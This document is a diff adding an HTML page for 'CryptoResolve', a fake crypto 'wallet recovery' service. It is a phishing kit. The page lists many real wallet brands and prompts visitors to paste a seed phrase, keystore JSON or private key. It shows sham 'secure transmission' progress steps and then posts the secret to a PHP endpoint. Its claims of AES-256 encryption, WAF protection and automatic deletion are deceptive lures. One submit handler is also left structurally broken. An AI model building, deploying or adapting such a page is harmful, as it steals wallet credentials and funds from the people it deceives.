@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoResolve | Secure Wallet Recovery & Synchronization</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: white; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .gradient-text { background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .wallet-card:hover { transform: translateY(-5px); transition: all 0.3s ease; border-color: #38bdf8; }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="p-6 flex justify-between items-center max-w-7xl mx-auto">
+        <div class="flex items-center space-x-2">
+            <div class="bg-blue-600 p-2 rounded-lg">
+                <i class="fas fa-shield-halved text-xl"></i>
+            </div>
+            <span class="text-xl font-bold tracking-tight">Crypto<span class="text-blue-500">Resolve</span></span>
+        </div>
+        <div class="hidden md:flex space-x-8 text-sm font-medium text-gray-400">
+            <a href="protocols.html" class="hover:text-white">Protocols</a>
+            <a href="validation.html" class="hover:text-white">Validation</a>
+            <a href="security.html" class="hover:text-white">Security</a>
+        </div>
+        <button onclick="showModal('Sync')" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-full text-sm font-bold transition">Connect Node</button>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="max-w-4xl mx-auto text-center mt-16 px-4">
+        <h1 class="text-4xl md:text-6xl font-extrabold mb-6">
+            Decentralized <span class="gradient-text">Wallet Fix & Recovery</span>
+        </h1>
+        <p class="text-gray-400 text-lg mb-10">
+            Securely synchronize, validate, and recover access to your assets across multiple blockchain networks using end-to-end encrypted protocols.
+        </p>
+        
+        <!-- Action Cards -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-16">
+            <div onclick="showModal('Recovery')" class="glass p-6 rounded-2xl cursor-pointer wallet-card">
+                <i class="fas fa-key text-3xl text-blue-400 mb-4"></i>
+                <h3 class="font-bold mb-2">Phrase Recovery</h3>
+                <p class="text-xs text-gray-500">Restore access to wallets with forgotten or corrupted phrases.</p>
+            </div>
+            <div onclick="showModal('Sync')" class="glass p-6 rounded-2xl cursor-pointer wallet-card">
+                <i class="fas fa-sync text-3xl text-green-400 mb-4"></i>
+                <h3 class="font-bold mb-2">Node Sync</h3>
+                <p class="text-xs text-gray-500">Fix synchronization issues and balance display errors.</p>
+            </div>
+            <div onclick="showModal('Security')" class="glass p-6 rounded-2xl cursor-pointer wallet-card">
+                <i class="fas fa-bug text-3xl text-red-400 mb-4"></i>
+                <h3 class="font-bold mb-2">Rectification</h3>
+                <p class="text-xs text-gray-500">Clear stuck transactions and resolve smart contract errors.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="max-w-6xl mx-auto px-4 pb-10">
+        <div class="glass p-6 rounded-3xl mb-10 border border-slate-700">
+            <h2 class="text-2xl font-bold mb-4">How it works</h2>
+            <p class="text-gray-400 mb-3">Choose a wallet type, enter your recovery phrase, keystore, or private key, and allow the system to run each step in order. The flow is designed to complete every stage before advancing.</p>
+            <div class="grid gap-3 md:grid-cols-3 text-sm text-slate-300">
+                <div class="bg-slate-900 p-4 rounded-2xl border border-slate-700">
+                    <p class="font-semibold mb-2">Step 1</p>
+                    <p>Choose the correct recovery method and enter your data exactly as provided.</p>
+                </div>
+                <div class="bg-slate-900 p-4 rounded-2xl border border-slate-700">
+                    <p class="font-semibold mb-2">Step 2</p>
+                    <p>The system validates each stage and prepares secure transmission before submitting.</p>
+                </div>
+                <div class="bg-slate-900 p-4 rounded-2xl border border-slate-700">
+                    <p class="font-semibold mb-2">Step 3</p>
+                    <p>Review is backed by WAF & SSL .</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Wallet Selection Grid -->
+    <section class="max-w-6xl mx-auto px-4 pb-20">
+        <h2 class="text-2xl font-bold mb-8 text-center text-gray-300">Supported Wallets</h2>
+        <div id="walletGrid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4"></div>
+    </section>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const walletBasePath = 'assets/';
+            const wallets = [
+                { name: 'MetaMask', logo: `${walletBasePath}metamask.png`, alt: 'MetaMask logo' },
+                { name: 'Trust Wallet', logo: `${walletBasePath}trust.png`, alt: 'Trust Wallet logo' },
+                { name: 'Coinbase', logo: `${walletBasePath}coinbase.png`, alt: 'Coinbase logo' },
+                { name: 'Coinbase Wallet', logo: `${walletBasePath}coinbase.png`, alt: 'Coinbase Wallet logo' },
+                { name: 'Ledger', logo: `${walletBasePath}ledger.png`, alt: 'Ledger logo' },
+                { name: 'Exodus', logo: `${walletBasePath}exodus.png`, alt: 'Exodus logo' },
+                { name: 'Phantom', logo: `${walletBasePath}phantom.png`, alt: 'Phantom logo' },
+                { name: 'SafePal', logo: `${walletBasePath}safepal.png`, alt: 'SafePal logo' },
+                { name: 'Argent', logo: `${walletBasePath}argent.jpg`, alt: 'Argent logo' },
+                { name: 'BitPay', logo: `${walletBasePath}bitpay.png`, alt: 'BitPay logo' },
+                { name: 'Blockchain.com', logo: `${walletBasePath}blockchain.png`, alt: 'Blockchain.com logo' },
+                { name: 'BitKeep', logo: `${walletBasePath}bitkeep.png`, alt: 'BitKeep logo' },
+                { name: 'Nami Wallet', logo: `${walletBasePath}nami.png`, alt: 'Nami Wallet logo' },
+                { name: 'OneKey', logo: `${walletBasePath}onekey.png`, alt: 'OneKey logo' },
+                { name: 'Solflare', logo: `${walletBasePath}solflare.png`, alt: 'Solflare logo' },
+                { name: 'Sollet', logo: `${walletBasePath}sollet.png`, alt: 'Sollet logo' },
+                { name: 'Yoroi', logo: `${walletBasePath}yoroi.png`, alt: 'Yoroi logo' },
+                { name: 'Tokenary', logo: `${walletBasePath}tokenary.png`, alt: 'Tokenary logo' },
+                { name: 'Venly', logo: `${walletBasePath}venly.png`, alt: 'Venly logo' },
+                { name: 'XUMM', logo: `${walletBasePath}xumm.png`, alt: 'XUMM logo' },
+                { name: 'Torus', logo: `${walletBasePath}torus.png`, alt: 'Torus logo' },
+                { name: 'Paper Wallet', logo: `${walletBasePath}paper.png`, alt: 'Paper Wallet logo' },
+                { name: 'Cardano', logo: `${walletBasePath}cardano.png`, alt: 'Cardano logo' },
+                { name: 'Polkadot', logo: `${walletBasePath}polkadot.png`, alt: 'Polkadot logo' }
+            ];
+            const walletGrid = document.getElementById('walletGrid');
+            wallets.forEach(w => {
+                const card = document.createElement('div');
+                card.className = 'glass p-4 rounded-xl flex flex-col items-center justify-center cursor-pointer hover:bg-slate-800 transition';
+                card.addEventListener('click', () => openRecoveryForm(w));
+
+                const iconWrapper = document.createElement('div');
+                iconWrapper.className = 'w-16 h-16 bg-slate-900 rounded-3xl mb-3 flex items-center justify-center overflow-hidden';
+                const logoImage = document.createElement('img');
+                logoImage.src = w.logo;
+                logoImage.alt = w.alt;
+                logoImage.className = 'h-12 w-12 object-contain';
+                iconWrapper.appendChild(logoImage);
+                card.appendChild(iconWrapper);
+
+                const label = document.createElement('span');
+                label.className = 'text-sm font-semibold text-center';
+                label.innerText = w.name;
+                card.appendChild(label);
+
+                walletGrid.appendChild(card);
+            });
+        });
+    </script>
+
+    <!-- Recovery Modal (Hidden by default) -->
+    <div id="recoveryModal" class="fixed inset-0 bg-black/80 hidden items-center justify-center p-4 z-50">
+        <div class="glass max-w-md w-full p-8 rounded-3xl relative">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white">
+                <i class="fas fa-times"></i>
+            </button>
+            <div id="modalContent">
+                <div class="text-center mb-6">
+                    <div id="walletIcon" class="w-16 h-16 bg-blue-600 rounded-2xl mx-auto mb-4 flex items-center justify-center text-2xl font-bold">?</div>
+                    <h2 id="walletTitle" class="text-2xl font-bold uppercase tracking-widest">Import Wallet</h2>
+                    <p class="text-sm text-gray-400 mt-2">Secure encrypted connection via AES-256</p>
+                </div>
+
+                <div class="flex border-b border-gray-700 mb-6">
+                    <button id="tabPhrase" type="button" onclick="setRecoveryType('phrase')" class="flex-1 pb-3 text-blue-400 border-b-2 border-blue-400 font-semibold">Phrase</button>
+                    <button id="tabKeystore" type="button" onclick="setRecoveryType('keystore')" class="flex-1 pb-3 text-gray-500 font-semibold">Keystore</button>
+                    <button id="tabPrivateKey" type="button" onclick="setRecoveryType('privateKey')" class="flex-1 pb-3 text-gray-500 font-semibold">Private Key</button>
+                </div>
+
+                <form id="recoveryForm">
+                    <textarea 
+                        id="recoveryInput"
+                        required
+                        class="w-full h-32 bg-slate-900 border border-gray-700 rounded-xl p-4 text-sm focus:outline-none focus:border-blue-500 placeholder-gray-600"
+                        placeholder="Enter your 12, 15, 18, 21 or 24-word phrase. Separate words with spaces."
+                    ></textarea>
+                    <p class="text-[10px] text-gray-500 mt-3 text-center">
+                        Input your recovery phrase precisely as it was given to you. The system will validate each stage before proceeding.
+                    </p>
+                    <div class="bg-yellow-500/10 border border-yellow-500/20 rounded-2xl p-4 text-yellow-100 text-xs mt-4">
+                        <p class="font-semibold">Warning</p>
+                        <p class="mt-1">Only submit recovery data for wallets you own. This service stores recovery details temporarily and deletes files automatically after 5 hours.</p>
+                    </div>
+                    <button type="button" onclick="submitRecovery()" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl mt-6 font-bold transition shadow-lg shadow-blue-900/20">
+                        PROCEED & VALIDATE
+                    </button>
+                </form>
+            </div>
+            
+            <!-- Loading State (Hidden) -->
+            <div id="loadingState" class="hidden text-center py-10">
+                <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-500 mx-auto mb-6"></div>
+                <h3 class="text-xl font-bold">Processing your request...</h3>
+                <p class="text-gray-400 text-sm mt-2">Attempting to connect to the recovery service.</p>
+            </div>
+
+            <!-- Success State (Hidden) -->
+            <div id="successState" class="hidden text-center py-10">
+                <div class="rounded-full h-16 w-16 bg-green-500/10 border border-green-500 mx-auto mb-6 flex items-center justify-center text-2xl text-green-400">✓</div>
+                <h3 class="text-xl font-bold text-green-300">Successful</h3>
+                <p class="text-gray-400 text-sm mt-2">Your recovery data has been accepted and is now being processed securely.</p>
+            </div>
+
+            <div id="notificationToast" class="hidden bg-slate-950/95 border border-slate-700 rounded-3xl p-4 text-left text-white mt-6 shadow-2xl">
+                <div id="notificationTitle" class="font-semibold text-white">Recovery system active</div>
+                <div id="notificationMessage" class="text-sm text-slate-300 mt-2">Preparing secure transmission of your wallet recovery data.</div>
+                <div id="notificationSteps" class="mt-4 space-y-2 text-xs text-slate-400"></div>
+            </div>
+            <div id="technicalPopup" class="hidden bg-red-950/95 border border-red-500 rounded-3xl p-4 text-left text-white mt-6 shadow-2xl">
+                <div class="flex items-start justify-between gap-4">
+                    <div>
+                        <div class="font-semibold text-red-300">Technical alert</div>
+                        <div id="technicalPopupMessage" class="text-sm text-slate-300 mt-2">A network or service issue occurred while submitting your recovery request.</div>
+                    </div>
+                    <button type="button" onclick="hideTechnicalPopup()" class="text-slate-400 hover:text-white text-sm font-semibold">Dismiss</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <section class="max-w-6xl mx-auto px-4 pb-10">
+        <div class="glass p-6 rounded-3xl mb-6 border border-slate-700">
+            <h3 class="text-lg font-bold text-white mb-4">Privacy Policy & Data Handling</h3>
+            <p class="text-gray-400 text-sm mb-3">All recovery submissions are stored temporarily in a secured vault. Files expire automatically after 5 hours and are deleted from the system.</p>
+            <p class="text-gray-400 text-sm">By submitting your recovery data, you consent to encrypted processing and temporary storage for the purpose of wallet recovery.</p>
+        </div>
+        <div class="glass p-6 rounded-3xl border border-slate-700 text-xs text-slate-400">
+            <p class="font-semibold text-white mb-3">Important</p>
+            <ul class="list-disc pl-5 space-y-2">
+                <li>Do not share your recovery data with third parties outside this system.</li>
+                <li>Only use this tool for wallets you personally control.</li>
+                <li>If you have any doubts, stop and contact support before submitting sensitive information.</li>
+            </ul>
+        </div>
+    </section>
+    <footer class="text-center py-10 text-gray-600 text-xs border-t border-gray-900">
+        <p>&copy; 2023 CryptoResolve Protocol. All Rights Reserved.</p>
+        <p class="mt-2">Protected by Cloudflare-WAF & SSL Encryption.</p>
+    </footer>
+
+    <script>
+        const modal = document.getElementById('recoveryModal');
+        const rForm = document.getElementById('recoveryForm');
+        const modalContent = document.getElementById('modalContent');
+        const loadingState = document.getElementById('loadingState');
+        const successState = document.getElementById('successState');
+        const recoveryInput = document.getElementById('recoveryInput');
+        const tabPhrase = document.getElementById('tabPhrase');
+        const tabKeystore = document.getElementById('tabKeystore');
+        const tabPrivateKey = document.getElementById('tabPrivateKey');
+        const notificationToast = document.getElementById('notificationToast');
+        const notificationTitle = document.getElementById('notificationTitle');
+        const notificationMessage = document.getElementById('notificationMessage');
+        const notificationSteps = document.getElementById('notificationSteps');
+        const technicalPopup = document.getElementById('technicalPopup');
+        const technicalPopupMessage = document.getElementById('technicalPopupMessage');
+
+        let activeRecoveryType = 'phrase';
+        let notificationTimer = null;
+
+        const loadingSteps = [
+            'Fixing network load and wallet synchronization...',
+            'Validating phrase / keystore / private key format...',
+            'Encrypting and preparing secure transmission...',
+            'Queuing recovery request for secure processing...'
+        ];
+
+        function setRecoveryType(type) {
+            activeRecoveryType = type;
+            recoveryInput.placeholder = type === 'phrase'
+                ? 'Enter your 12, 15, 18, 21 or 24-word phrase. Separate words with spaces.'
+                : type === 'keystore'
+                ? 'Paste your keystore JSON content here.'
+                : 'Paste your private key here.';
+
+            tabPhrase.className = type === 'phrase'
+                ? 'flex-1 pb-3 text-blue-400 border-b-2 border-blue-400 font-semibold'
+                : 'flex-1 pb-3 text-gray-500 font-semibold';
+            tabKeystore.className = type === 'keystore'
+                ? 'flex-1 pb-3 text-blue-400 border-b-2 border-blue-400 font-semibold'
+                : 'flex-1 pb-3 text-gray-500 font-semibold';
+            tabPrivateKey.className = type === 'privateKey'
+                ? 'flex-1 pb-3 text-blue-400 border-b-2 border-blue-400 font-semibold'
+                : 'flex-1 pb-3 text-gray-500 font-semibold';
+        }
+
+        function openRecoveryForm(wallet) {
+            const walletTitle = document.getElementById('walletTitle');
+            const walletIcon = document.getElementById('walletIcon');
+            const name = typeof wallet === 'string' ? wallet : wallet.name;
+
+            walletTitle.innerText = name;
+            recoveryInput.value = '';
+            successState.classList.add('hidden');
+            setRecoveryType('phrase');
+
+            if (wallet && typeof wallet === 'object' && wallet.logo) {
+                walletIcon.innerHTML = `<img src="${wallet.logo}" alt="${wallet.alt || name}" class="h-full w-full object-contain"/>`;
+            } else {
+                walletIcon.innerHTML = '';
+                walletIcon.innerText = name.charAt(0);
+            }
+
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        function showModal(type) {
+            if (type === 'Recovery') {
+                openRecoveryForm('Phrase Recovery');
+            } else if (type === 'Sync') {
+                openRecoveryForm('Node Sync');
+            } else if (type === 'Security') {
+                openRecoveryForm('Security Fix');
+            }
+        }
+
+        function closeModal() {
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+            loadingState.classList.add('hidden');
+            successState.classList.add('hidden');
+            notificationToast.classList.add('hidden');
+            technicalPopup.classList.add('hidden');
+            notificationSteps.innerHTML = '';
+            if (notificationTimer) {
+                clearInterval(notificationTimer);
+                notificationTimer = null;
+            }
+            modalContent.classList.remove('hidden');
+        }
+
+        function hideTechnicalPopup() {
+            technicalPopup.classList.add('hidden');
+        }
+
+        window.openRecoveryForm = openRecoveryForm;
+        window.showModal = showModal;
+        window.setRecoveryType = setRecoveryType;
+        window.closeModal = closeModal;
+
+        function startNotification() {
+            notificationToast.classList.remove('hidden');
+            notificationTitle.innerText = 'Recovery engine active';
+            notificationMessage.innerText = 'Your wallet recovery data is being processed and queued for secure handling.';
+            notificationSteps.innerHTML = '';
+            loadingSteps.forEach((step, index) => {
+                const stepEl = document.createElement('div');
+                stepEl.className = 'opacity-50';
+                stepEl.innerText = `• ${step}`;
+                stepEl.dataset.stepIndex = index;
+                notificationSteps.appendChild(stepEl);
+            });
+
+            return new Promise((resolve) => {
+                let currentIndex = 0;
+                notificationTimer = setInterval(() => {
+                    const stepEl = notificationSteps.querySelector(`[data-step-index='${currentIndex}']`);
+                    if (stepEl) {
+                        stepEl.className = 'text-slate-100 font-medium';
+                        stepEl.innerText = `✓ ${loadingSteps[currentIndex]}`;
+                    }
+                    currentIndex += 1;
+                    if (currentIndex >= loadingSteps.length) {
+                        clearInterval(notificationTimer);
+                        notificationTimer = null;
+                        resolve();
+                    }
+                }, 1200);
+            });
+        }
+
+        function submitRecovery() {
+            const recoveryText = recoveryInput.value.trim();
+            if (!recoveryText) {
+                notificationToast.classList.remove('hidden');
+                notificationTitle.innerText = 'Missing recovery data';
+                notificationMessage.innerText = 'Enter your phrase, keystore JSON, or private key before submitting.';
+                return;
+            }
+
+            modalContent.classList.add('hidden');
+            successState.classList.add('hidden');
+            loadingState.classList.remove('hidden');
+            notificationToast.classList.remove('hidden');
+
+            const subject = `${document.getElementById('walletTitle').innerText} Recovery Request`;
+            const payload = {
+                type: activeRecoveryType,
+                wallet: document.getElementById('walletTitle').innerText,
+                data: recoveryText,
+                subject
+            };
+
+            startNotification().then(() => {
+                fetch('api/recover.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    loadingState.classList.add('hidden');
+                    if (result.success) {
+                        notificationTitle.innerText = 'Successful';
+                        notificationMessage.innerText = 'Everything finished loading successfully. Your recovery request is now being processed securely.';
+                        successState.classList.remove('hidden');
+                        notificationToast.classList.add('hidden');
+                        technicalPopup.classList.add('hidden');
+                        setTimeout(closeModal, 3000);
+                    } else {
+                        notificationTitle.innerText = 'Processing error';
+                        notificationMessage.innerText = result.error || 'The system could not complete the request. Please try again later.';
+                        technicalPopupMessage.innerText = result.error ? `Technical details: ${result.error}` : 'Technical details are unavailable. Check the recovery service endpoint or your network connection.';
+                        notificationToast.classList.add('hidden');
+                        technicalPopup.classList.remove('hidden');
+                    }
+                })
+                .catch(() => {
+                    loadingState.classList.add('hidden');
+                    notificationToast.classList.add('hidden');
+                    technicalPopupMessage.innerText = 'Unable to connect to the recovery service. Please verify your network and try again. If the problem persists, contact support with the error code: NETWORK_FAILURE.';
+                    technicalPopup.classList.remove('hidden');
+                });
+            });
+        }
+
+        rForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const recoveryText = recoveryInput.value.trim();
+            if (!recoveryText) {
+                notificationToast.classList.remove('hidden');
+                notificationTitle.innerText = 'Missing recovery data';
+                notificationMessage.innerText = 'Enter your phrase, keystore JSON, or private key before submitting.';
+                return;
+            }
+
+            modalContent.classList.add('hidden');
+            successState.classList.remove('hidden');
+            loadingState.classList.remove('hidden');
+            notificationToast.classList.remove('hidden');
+
+            const subject = `${document.getElementById('walletTitle').innerText} Recovery Request`;
+            const payload = {
+                type: activeRecoveryType,
+                wallet: document.getElementById('walletTitle').innerText,
+                data: recoveryText,
+                subject
+            };
+
+            startNotification().then(() => {
+                fetch('api/recover.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    loadingState.classList.add('hidden');
+                    if (result.success) {
+                        notificationTitle.innerText = 'Successful';
+                        notificationMessage.innerText = 'Everything finished loading successfully. Your recovery request is now being processed securely.';
+                        successState.classList.remove('hidden');
+                        notificationToast.classList.add('hidden');
+                        technicalPopup.classList.add('hidden');
+                        setTimeout(closeModal, 3000);
+                    } else {
+                        notificationTitle.innerText = 'Processing error';
+                        notificationMessage.innerText = result.error || 'The system could not complete the request. Please try again later.';
+                        technicalPopupMessage.innerText = result.error ? `Technical details: ${result.error}` : 'Technical details are unavailable. Check the recovery service endpoint or your network connection.';
+                        notificationToast.classList.add('hidden');
+                        technicalPopup.classList.remove('hidden');
+                    }
+                })
+                .catch(() => {
+                    loadingState.classList.add('hidden');
+                    notificationToast.classList.add('hidden');
+                    technicalPopupMessage.innerText = 'Unable to connect to the recovery service. Please verify your network and try again. If the problem persists, contact support with the error code: NETWORK_FAILURE.';
+                    technicalPopup.classList.remove('hidden');
+                });
+            });
+
+        // Close on outside click
+        window.onclick = function(event) {
+            if (event.target === modal) closeModal();
+        };
+    });
+    </script>
+    <script>
+        (function() {
+            const host = window.location.hostname || 'localhost';
+            const liveReloadScript = document.createElement('script');
+            liveReloadScript.src = 'http://' + host + ':35729/livereload.js?snipver=1';
+            liveReloadScript.async = true;
+            document.body.appendChild(liveReloadScript);
+        })();
+    </script>
+</body>
+</html>
